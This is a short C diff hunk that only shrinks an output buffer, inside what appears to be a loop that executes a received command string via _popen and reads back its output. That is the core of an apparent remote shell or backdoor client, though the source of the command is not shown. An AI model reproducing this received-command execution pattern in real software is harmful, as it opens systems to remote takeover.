@@ -71,7 +71,7 @@ int main() {
         // Perform received command
         FILE *fp = _popen(cmd, "r");
 
-        char output[4096];
+        char output[1024];
         int n_bytes;
         while ((n_bytes = fread(output, 1, sizeof(output), fp)) > 0) {
 
